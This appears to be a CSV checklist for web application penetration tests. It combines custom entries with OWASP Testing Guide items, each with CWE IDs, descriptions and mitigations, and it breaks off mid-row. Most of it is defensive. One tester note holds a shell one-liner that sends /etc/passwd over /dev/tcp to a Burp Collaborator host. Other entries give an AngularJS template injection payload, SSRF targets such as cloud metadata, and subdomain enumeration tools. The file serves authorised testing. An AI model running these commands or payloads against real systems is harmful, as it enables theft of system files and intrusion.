EXT-20180329T180937,Extras,Default error pages shown,,,Incorrect Error Handling  (stack traces),,2,"Check that when resources don't exist, a graceful 404 pages is displayed.",Extras,,,"The remote application does not properly handle application errors, and application stacktraces are displayed to the end user leading to information disclosure vulnerability.","Implement a standard exception handling mechanism to intercept all errors.

2.5	Disable client facing Stack Traces (from CIS Benchmark for Tomcat 8.X)

Perform the following to prevent Tomcat from providing debug information to the requestor during runtime errors:

- Create a web page that contains the logic or message you wish to invoke when encountering a runtime error. For example purposes, assume this page is located at /error.jsp. 
- Add a child element, <error-page>, to the <web-app>element, in the $CATALINA_HOME/conf/web.xml file. 
- Add a child element, <exception-type>, to the <error-page> element. Set the value of the <exception-type> element to java.lang.Throwable. 
- Add a child element, <location>, to the <error-page> element. Set the value of the <location> element to the location of page created in #1.

The resulting entry will look as follows:

<error-page>
 <exception-type>java.lang.Throwable</exception-type>
 <location>/error.jsp</location>
</error-page>",true,http://cwe.mitre.org/data/definitions/388.html,https://www.owasp.org/index.php/Error_Handling,,209,true,,
EXT-20180410T031925,Extras,Reflected File Download,,,Reflected File Download,,3,,Extras,,,"RFD, like many other Web attacks, begins by sending a malicious link to a victim. But unlike other attacks, RFD ends outside of the browser context:

1) The user follows a malicious link to a trusted web site.
2) An executable file is downloaded and saved on the user's machine. All security indicators show that the file was ""hosted"" on the trusted web site.
3) The user executes the file which contains shell commands that gain complete control over the computer.
For a Reflected File Download attack to be successful, there are three simple requirements:

1) Reflected – Some user input is being ""reflected"" to the response content. This is used to inject shell commands.
2) Filename – The URL of the vulnerable site or API is permissive and accepts additional input. This is often the case and is used by attackers to set the extension of the file to an executable extension.
3) Download – The response is being downloaded and a file is created ""on-the-fly"" by the Web browser. The browser then sets the attacker-controlled filename that was parsed in requirement 2 above.","Reflected File Download can be mitigated by securing Web facing interfaces using the following:

a) Use exact URL mapping – when mapping APIs, Servlet and web pages and when writing rewrite rules, make sure that hackers cannot enter additional characters after the resource name. Any additional characters in the URL should result in a 404 error.

b) Do not escape! Encode! – Escaping such as Backslash escaping always contains the problematic character. If escaping is used double quotes (“) turn into (\”). Prefer encoding of user controlled input. In JavaScript for example, double quotes (“) turn into (\x22) or (\u0022) which is a lot safer.

c) Add Content-Disposition with a “filename” attribute for APIs: Content-Disposition: attachment; filename=1.txt

Setting the filename attribute spares the Browser from trying to guess what the filename is. Web APIs like JSON/JSONP are not user facing. There is no reason for a user to access such APIs directly from the address bar or by following a link. By adding the above header to all API responses, the file is downloaded and saved as 1.txt which is considered harmless. This is also a good practice to help mitigate XSS vulnerabilities in APIs.

d) Whitelist Callbacks – there has been numerous attacks that abuse JSONP Callbacks. If you think about it, you might not really need the Callback to be completely dynamic.

e) Require custom headers – as mentioned before, there is no reason for a user to access APIs directly. By requiring a Custom HTTP Header for all API calls, one can harness the power of Same-Origin-Policy on the client side. This makes RFD unexploitable unless another vulnerability is involved.

f) If possible, require CSRF tokens – by doing so hackers won’t be able to build a working RFD link and sent it to their victims.

g) Never include user input in API usage errors – when it comes to JSON/JSONP, code is accessing code. Usage errors are rare, and when occur should be logged. The response should not include the erroneous input but rather a reference number that can be tracked down for troubleshooting.

h) Remove support for Path parameters – If you don’t really use it then lose it. Most developers are not even aware of the existence of Path Parameters, and I found this section of the URL extremely vulnerable to various attacks (including XSS).

i) Add X-Content-Type-Options headers – if the resource is responding with a text/plain or unknown content-type, attackers can make browser “guess” that the file is binary and required download (meeting the third RFD requirement). The following header can prevent this from happening in some browsers:
X-Content-Type-Options: nosniff",,http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-5211,,https://www.trustwave.com/Resources/SpiderLabs-Blog/Reflected-File-Download---A-New-Web-Attack-Vector/,20,,,
EXT-20180410T032656,Extras,Hardcoded password,,,Use of Hard-coded Password,,2,,Extras,,,"The software contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components.

A method uses a hard-coded password that may compromise system security in a way that cannot be easily remedied. The use of a hard-coded password significantly increases the possibility that the account being protected will be compromised. Moreover, the password cannot be changed without patching the software. If a hard-coded password is compromised in a commercial product, all deployed instances may be vulnerable to attack.
","Store passwords out-of-band from the application code. Follow best practices for protecting credentials stored in locations such as configuration or properties files.

PHASE:Architecture and Design
DESCRIPTION:For outbound authentication: store passwords outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible.

PHASE:Architecture and Design
DESCRIPTION:For inbound authentication: Rather than hard-code a default username and password for first time logins, utilize a first login mode that requires the user to enter a unique strong password.

PHASE:Architecture and Design
DESCRIPTION:Perform access control checks and limit which entities can access the feature that requires the hard-coded password. For example, a feature might only be enabled through the system console instead of through a network connection.

PHASE:Architecture and Design
DESCRIPTION:For inbound authentication: apply strong one-way hashes to your passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When receiving an incoming password during authentication, take the hash of the password and compare it to the hash that you have saved. Use randomly assigned salts for each separate hash that you generate. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.

PHASE:Architecture and Design
DESCRIPTION:For front-end to back-end connections: Three solutions are possible, although none are complete. The first suggestion involves the use of generated passwords which are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals. Next, the passwords used should be limited at the back end to only performing actions valid for the front end, as opposed to having full access. Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay style attacks.",,,,,259,,,
EXT-20190110T035355,Extras,Improper Output Neutralization for Logs (CWE ID 117),,,Improper Output Neutralization for Logs (CRLF Injection),,2,,Extras,,,"The software does not neutralize or incorrectly neutralizes output that is written to logs.

A function call could result in a log forging attack. Writing untrusted data into a log file allows an attacker to forge log entries or inject malicious content into log files. Corrupted log files can be used to cover an attacker's tracks or as a delivery mechanism for an attack on a log viewing or processing utility. For example, if a web administrator uses a browser-based utility to review logs, a cross-site scripting attack might be possible.","Avoid directly embedding user input in log files when possible. Sanitize untrusted data used to construct log entries by using a safe logging mechanism such as the OWASP ESAPI Logger, which will automatically remove unexpected carriage returns and line feeds and can be configured to use HTML entity encoding for non-alphanumeric data. Only write custom blacklisting code when absolutely necessary. Always validate untrusted input to ensure that it conforms to the expected format, using centralized data validation routines when possible.

PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

PHASE:Implementation
STRATEGY:Output Encoding
DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.

PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.",true,,,,117,,,
EXT-20190202T182911,Extras,"External service interaction (HTTP SSRF, Burp Issue)",,,Server-Side Request Forgery (SSRF),,,,Extras,,,"External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences.

The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.",,,,,https://portswigger.net/kb/issues/00300210_external-service-interaction-http,918,,,
EXT-20190303T150457,Extras,Vulnerabilities from network scan of public footprint,,,Network vulnerability scan results for public footprint,,0,Copy results from recent vuln scan.,Extras,,,,,true,,,,0,true,,
EXT-20190303T170006,Extras,Nmap script scan,,,Nmap script scan results,,0,Run nmap script scan,Extras,,,,,,,,,0,,,
EXT-20190303T173125,Extras,Software Composition Analysis (SCA) Results,,,Software Composition Analysis (SCA),,0,Include results from software composition analysis.,Extras,,,"Ensure that SCA was performed that the results are acceptable (no High+, no risky CVEs...).",,true,,,,0,,,
EXT-20190303T191547,Extras,App screenshots,,,App. Screenshots,,0,Just take a few screenshots of the app under test for future reference.,Extras,,,"Just a few screenshots of the app, during testing.",N/A.,true,,,,0,,,
EXT-20161108T220809,Extras,Search for subdomains,,,,,,"Use a subdomain research tool to find subdomains:
- Search engines (Google, Bing, Yahoo, Baidu)
- https://virustotal.com/ - Search for “domain:target.com” and virustotal will provide extensive information in addition to Observed subdomains.
- https://dnsdumpster.com - The name says it all. Enter the target domain, hit search.
- https://crt.sh/?q=%25target.com - Sometimes SSL is a goldmine of information. Use this site by searching for “%target.com” and it’ll get back with subdomains to you. 
- https://censys.io - Not great but has some useful information sometimes.
- http://searchdns.netcraft.com/
- https://www.shodan.io
- https://github.com/aboul3la/Sublist3r
- https://www.dnsdb.info/
- Similar Web ($$$) - used Chrome extensions (using leaked internal subdomains)

Bruteforcing:
    Subbrute - A DNS meta-query spider that enumerates DNS records, and subdomains.
    dnscan - a python wordlist-based DNS subdomain scanner.
    Nmap - Yes it's a port scanner, but it can bruteforce subdomains too (check nmap scripts)
    Recon-Ng - The recon-ng framework has a brute_hosts module that allows to bruteforce subdomains.
    DNSRecon - A powerful DNS enumeration script
    Fierce - A semi-lightweight enumeration scanner
    Gobuster - Alternative directory and file busting tool written in Go
    DNSenum - Offers recursive and threaded subdomain enumeration.
    AltDNS - offers bruteforcing based on permutations of already found domains
",Extras,,,,,,,,https://dnsdumpster.com,,,,
EXT-20161108T150517,Extras,AngularJS Template Injection,,,AngularJS Template Injection,,3,"Try injecting payload that Angular would interpret.

Example:
<script src=""https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js""></script>
<div ng-app>Val:{{1+1}}</div>

Refs:
- https://hackerone.com/reports/125027
- http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
- https://docs.angularjs.org/guide/expression
",Extras,,,,,,,,http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html,,,,
EXT-20161214T170114,Extras,Server-Side Request Forgery (SSRF),,,Server-Side Request Forgery (SSRF),,3,"Try this:
- https://www.owasp.org/index.php/OWASP_Skanda_SSRF_Exploitation_Framework
- https://github.com/jacobreynolds/ssrfdetector
- Use Burp Collaborator client to monitor for Burp-triggered server-side requests

Overview
In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or a modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.

Description
The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.).

When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs the attacker may be able to read data from services that are not directly exposed on the internet:

Cloud server meta-data - Cloud services such as AWS provide a REST interface on http://169.254.169.254/ where important configuration and sometimes even authentication keys can be extracted
Database HTTP interfaces - NoSQL database such as MongoDB provide REST interfaces on HTTP ports. If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data
Internal REST interfaces
Files - The attacker may be able to read files using file:// URIs
The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.
",Extras,,,"The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.

By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.

This weakness is also known as XSPA:	Cross Site Port Attack. ",,true,https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface,https://www.owasp.org/index.php/Server_Side_Request_Forgery,https://www.owasp.org/index.php/Server_Side_Request_Forgery,918,,,
EXT-20190306T191531,Extras,Test for credit card number disclosure,,,Credit card number entry is accepted and data is propagated (missing 'DLP' requirement?),,0,"Search app data and logs for possible disclosure of credit card information. If possible, use SIEM tools to support log investigation. ",Extras,,,The software may be storing sensitive information without properly limiting read or write access by unauthorized actors.,Review the sensitivity of the data and make sure that the system has appropriate controls to avoid inadvertent disclosure of sensitive information.,true,,,,200,true,,
EXT-20190307T231008,Extras,Run Burp Scanner,,,Burp scan and analysis,,0,Run Burp Scanner against all important app sections/contexts. Review all issues with Severity >= Medium.,Extras,,,,,true,https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner,,https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner,0,,,
EXT-20190310T180722,Extras,Testing methodology and approach,,,Testing Approach,,0,Take notes on the approach taken during the testing.,Extras,,,,,true,,,,0,,,
EXT-20190311T130927,Extras,Information Leakage,,,Usage analytics sent to Google Analytics,,0,,Extras,,,"The software uses a resource that contains sensitive data, but it does not properly remove that data before it stores, transfers, or shares the resource with actors in another control sphere.","PHASE:Requirements
DESCRIPTION:Clearly specify which information should be regarded as private or sensitive, and require that the product offers functionality that allows the user to cleanse the sensitive information from the resource before it is published or exported to other parties.

PHASE:Architecture and Design
STRATEGY:Separation of Privilege
DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.

PHASE:Implementation
STRATEGY:Attack Surface Reduction
EFFECTIVENESS:Defense in Depth
DESCRIPTION:Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.

PHASE:Implementation
DESCRIPTION:Avoid errors related to improper resource shutdown or release (CWE-404), which may leave the sensitive data within the resource if it is in an incomplete state.",,,,,212,,,
EXT-20190311T145050,Extras,Outdated/vulnerable client-side component,,,Outdated/vulnerable client-side components,,2,,Extras,,,,"PHASE:Implementation
DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.

PHASE:Implementation
STRATEGY:Output Encoding
DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.

PHASE:Implementation
DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.

PHASE:Implementation
STRATEGY:Attack Surface Reduction
DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
EFFECTIVENESS:Defense in Depth",,,,,1026,,,
EXT-20190312T170431,Extras,Scoping Information,,,Scoping Information,,0,"Provide high-level scoping information for the project, to be included in the report.",Extras,,,,,true,,,,0,,,
EXT-20190314T030421,Extras,Try Burp Collaborator,,,,,,"Try these:
$ echo -e ""GET / HTTP/1.1\r\nhost: http://qga92es194u6457ezgb1v9zn7ed51u.burpcollaborator.net\r\nConnection: close\r\n\r\n$(cat /etc/passwd)"" > /dev/tcp/qga92es194u6457ezgb1v9zn7ed51u.burpcollaborator.net/80

Details on /dev/tcp:
- http://tldp.org/LDP/abs/html/devref1.html
",Extras,,,,,,,,https://portswigger.net/burp/documentation/collaborator,,,,
OTG4-4.02.01,OWASP-TG4,Conduct search engine discovery/reconnaissance for information leakage (OTG-INFO-001),,,Information Exposure Through Indexing of Private Data,,,,4.2 Information Gathering,,4.02.01,"The product performs an indexing routine against private documents, but does not sufficiently verify that the actors who can access the index also have the privileges to access the private documents.",,,,,https://www.owasp.org/index.php/Conduct_search_engine_discovery/reconnaissance_for_information_leakage_(OTG-INFO-001),612,,false,
OTG4-4.02.02,OWASP-TG4,Fingerprint Web Server (OTG-INFO-002),,,Information exposure through server error messages or default headers,,1,,4.2 Information Gathering,,4.02.02,"Certain conditions, such as network failure or simple unexpected client requests will cause a server error message to be displayed. When default error handling is used, system configuration or version are often revealed and this is useful to identify applicable/known attacks.","PHASE:Architecture and Design System Configuration
DESCRIPTION:Recommendations include designing and adding consistent error handling mechanisms which are capable of handling any user input to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed.",true,,,https://www.owasp.org/index.php/Fingerprint_Web_Server_(OTG-INFO-002),550,,false,
EXT-20190314T154101,Extras,WAPT Runner testing,,,No corresponding CWE,,,Just a dummy test to try stuff in WAPT Runner.,Extras,,,,,,,,,0,,,
OTG4-4.02.04,OWASP-TG4,Enumerate Applications on Webserver (OTG-INFO-004),,,REST API Information Exposure,,0,,4.2 Information Gathering,,4.02.04,An information exposure is the intentional or unintentional disclosure of information to an actor that is not explicitly authorized to have access to that information.,"PHASE:Architecture and Design
STRATEGY:Separation of Privilege
DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.",,,,https://www.owasp.org/index.php/Enumerate_Applications_on_Webserver_(OTG-INFO-004),200,,false,
OTG4-4.02.05,OWASP-TG4,Review webpage comments and metadata for information leakage (OTG-INFO-005),,,Sensitive Data Exposure,,3,,4.2 Information Gathering,,4.02.05,"While adding general comments is very useful, some programmers tend to leave important data, such as: filenames related to the web application, old links or links which were not meant to be browsed by users, old code fragments, etc.","PHASE:Distribution
DESCRIPTION:Remove comments which have sensitive information about the design/implementation of the application. Some of the comments may be exposed to the user and affect the security posture of the application.::",true,,,https://www.owasp.org/index.php/Review_webpage_comments_and_metadata_for_information_leakage_(OTG-INFO-005),615,,true,
OTG4-4.02.06,OWASP-TG4,Identify application entry points (OTG-INFO-006),,,,,,,4.2 Information Gathering,,4.02.06,,,,,,https://www.owasp.org/index.php/Identify_application_entry_points_(OTG-INFO-006),,,false,
EXT-20190316T152442,Extras,Check for HttpOnly flag on important cookies,,,Sensitive Cookie Without 'HttpOnly' Flag,,2,,Extras,,,,"PHASE:Implementation
DESCRIPTION:Leverage the HttpOnly flag when setting a sensitive cookie in a response.
EFFECTIVENESS:High",true,,,,1004,,,
OTG4-4.02.03,OWASP-TG4,Review Webserver Metafiles for Information Leakage (OTG-INFO-003),,,,,,,4.2 Information Gathering,,4.02.03,,,,,,https://www.owasp.org/index.php/Review_Webserver_Metafiles_for_Information_Leakage_(OTG-INFO-003),,,false,
OTG4-4.02.09,OWASP-TG4,Fingerprint Web Application (OTG-INFO-009),,,,,,,4.2 Information Gathering,,4.02.09,,,,,,https://www.owasp.org/index.php/Fingerprint_Web_Application_(OTG-INFO-009),,,false,
OTG4-4.02.10,OWASP-TG4,Map Application Architecture (OTG-INFO-010),,,,,,,4.2 Information Gathering,,4.02.10,,,,,,https://www.owasp.org/index.php/Map_Application_Architecture_(OTG-INFO-010),,,false,
OTG4-4.03.01,OWASP-TG4,Test Network/Infrastructure Configuration (OTG-CONFIG-001),,,Insufficient Control of Network Message Volume (Network Amplification),,,,4.3 Config and Deployment Mgmt Testing,,4.03.01,"The software does not sufficiently monitor or control transmitted network traffic volume, so that an actor can cause the software to transmit more traffic than should be allowed for that actor.","PHASE:Architecture and Design
STRATEGY:Separation of Privilege
DESCRIPTION:An application must make network resources available to a client commensurate with the client's access level.

PHASE:Policy
DESCRIPTION:Define a clear policy for network resource allocation and consumption.

PHASE:Implementation
DESCRIPTION:An application must, at all times, keep track of network resources and meter their usage appropriately.::",,,,https://www.owasp.org/index.php/Test_Network/Infrastructure_Configuration_(OTG-CONFIG-001),406,,true,
OTG4-4.03.02,OWASP-TG4,Test Application Platform Configuration (OTG-CONFIG-002),,,Insufficient app/web server hardening (security misconfiguration),,2,,4.3 Config and Deployment Mgmt Testing,,4.03.02,"Insufficiently hardened web/app servers can lead to various issues including information disclosure (confidentiality), modification of system files or app data (integrity) and denial-of-service (availability). ","When building new web app or web services, we should follow hardening guidelines from CIS or other known security baselines. See other findings in this report. We also recommend disabling the SHUTDOWN port as described in the  Notes.
",true,,,https://www.owasp.org/index.php/Test_Application_Platform_Configuration_(OTG-CONFIG-002),933,,true,
OTG4-4.03.03,OWASP-TG4,Test File Extensions Handling for Sensitive Information (OTG-CONFIG-003),,,,,,,4.3 Config and Deployment Mgmt Testing,,4.03.03,,,,,,https://www.owasp.org/index.php/Test_File_Extensions_Handling_for_Sensitive_Information_(OTG-CONFIG-003),,,true,
OTG4-4.03.04,OWASP-TG4,"Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)",,,Exposure of Backup File to an Unauthorized Control Sphere,,0,,4.3 Config and Deployment Mgmt Testing,,4.03.04,A backup file is stored in a directory that is accessible to actors outside of the intended control sphere.,"PHASE:Policy
DESCRIPTION:Recommendations include implementing a security policy within your organization that prohibits backing up web application source code in the webroot.",,,,"https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)",530,,true,
OTG4-4.03.05,OWASP-TG4,Enumerate Infrastructure and Application Admin Interfaces (OTG-CONFIG-005),,,Improper Access Control,,,,4.3 Config and Deployment Mgmt Testing,,4.03.05,The software does not restrict or incorrectly restricts access to a resource from an unauthorized actor.,"PHASE:Architecture and Design Operation
DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.

PHASE:Architecture and Design
STRATEGY:Separation of Privilege
DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.::",,,,https://www.owasp.org/index.php/Enumerate_Infrastructure_and_Application_Admin_Interfaces_(OTG-CONFIG-005),284,,true,
OTG4-4.03.06,OWASP-TG4,Test HTTP Methods (OTG-CONFIG-006),,,Trusting HTTP Permission Methods on the Server Side,,2,,4.3 Config and Deployment Mgmt Testing,,4.03.06,"The server contains a protection mechanism that assumes that any URI that is accessed using HTTP GET will not cause a state change to the associated resource. This might allow attackers to bypass intended access restrictions and conduct resource modification and deletion attacks, since some applications allow GET to modify state.","PHASE:System Configuration
DESCRIPTION:Configure ACLs on the server side to ensure that proper level of access control is defined for each accessible resource representation.",true,,,https://www.owasp.org/index.php/Test_HTTP_Methods_(OTG-CONFIG-006),650,,true,
OTG4-4.03.07,OWASP-TG4,Test HTTP Strict Transport Security (OTG-CONFIG-007),,,,,,,4.3 Config and Deployment Mgmt Testing,,4.03.07,,,,,,https://www.owasp.org/index.php/Test_HTTP_Strict_Transport_Security_(OTG-CONFIG-007),818,,true,
OTG4-4.03.08,OWASP-TG4,Test RIA cross domain policy (OTG-CONFIG-008),,,,,,,4.3 Config and Deployment Mgmt Testing,,4.03.08,,,,,,https://www.owasp.org/index.php/Test_RIA_cross_domain_policy_(OTG-CONFIG-008),,,true,
OTG4-4.03.09,OWASP-TG4,Test File Permission (OTG-CONFIG-009),,,,,,,4.3 Config and Deployment Mgmt Testing,,4.03.09,,,,,,https://www.owasp.org/index.php/Test_File_Permission_(OTG-CONFIG-009),,,true,
OTG4-4.04.01,OWASP-TG4,Test Role Definitions (OTG-IDENT-001),,,,,,,4.4 Identity Mgmt Testing,,4.04.01,,,,,,https://www.owasp.org/index.php/Test_Role_Definitions_(OTG-IDENT-001),,,false,
OTG4-4.04.02,OWASP-TG4,Test User Registration Process (OTG-IDENT-002),,,,,,,4.4 Identity Mgmt Testing,,4.04.02,,,,,,https://www.owasp.org/index.php/Test_User_Registration_Process_(OTG-IDENT-002),,,false,
OTG4-4.04.03,OWASP-TG4,Test Account Provisioning Process (OTG-IDENT-003),,,,,,,4.4 Identity Mgmt Testing,,4.04.03,,,,,,https://www.owasp.org/index.php/Test_Account_Provisioning_Process_(OTG-IDENT-003),,,false,
OTG4-4.04.04,OWASP-TG4,Testing for Account Enumeration and Guessable User Account (OTG-IDENT-004),,,,,,,4.4 Identity Mgmt Testing,,4.04.04,,,,,,https://www.owasp.org/index.php/Testing_for_Account_Enumeration_and_Guessable_User_Account_(OTG-IDENT-004),203,,true,
OTG4-4.04.05,OWASP-TG4,Testing for Weak or unenforced username policy (OTG-IDENT-005),,,,,,,4.4 Identity Mgmt Testing,,4.04.05,,,,,,https://www.owasp.org/index.php/Testing_for_Weak_or_unenforced_username_policy_(OTG-IDENT-005),,,false,
OTG4-4.05.01,OWASP-TG4,Testing for Credentials Transported over an Encrypted Channel (OTG-AUTHN-001),,,,,,,4.5 Authentication Testing,,4.05.01,,,,,,https://www.owasp.org/index.php/Testing_for_Credentials_Transported_over_an_Encrypted_Channel_(OTG-AUTHN-001),934,true,true,
OTG4-4.02.07,OWASP-TG4,Map execution paths through application (OTG-INFO-007),,,,,,,4.2 Information Gathering,,4.02.07,,,,,,https://www.owasp.org/index.php/Map_execution_paths_through_application_(OTG-INFO-007),,,false,
OTG4-4.02.08,OWASP-TG4,Fingerprint Web Application Framework (OTG-INFO-008),,,,,,,4.2 Information Gathering,,4.02.08,,,,,,https://www.owasp.org/index.php/Fingerprint_Web_Application_Framework_(OTG-INFO-008),,,false,
OTG4-4.05.02,OWASP-TG4,Testing for default credentials (OTG-AUTHN-002),,,,,,,4.5 Authentication Testing,,4.05.02,,,,,,https://www.owasp.org/index.php/Testing_for_default_credentials_(OTG-AUTHN-002),521,true,true,
OTG4-4.05.03,OWASP-TG4,Testing for Weak lock out mechanism (OTG-AUTHN-003),,,,,,,4.5 Authentication Testing,,4.05.03,,,,,,https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003),930,true,true,
OTG4-4.05.04,OWASP-TG4,Testing for Bypassing Authentication Schema (OTG-AUTHN-004),,,Missing Authentication for Critical Function,,3,"When we have the app fully mapped out, check for improper password protection for some sections.",4.5 Authentication Testing,,4.05.04,The software does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.,"PHASE:Architecture and Design
DESCRIPTION:Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability. Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port. In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.

PHASE:Architecture and Design
DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

PHASE:Architecture and Design
DESCRIPTION:Where possible, avoid implementing custom authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These may make it easier to provide a clear separation between authentication tasks and authorization tasks. In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.

PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
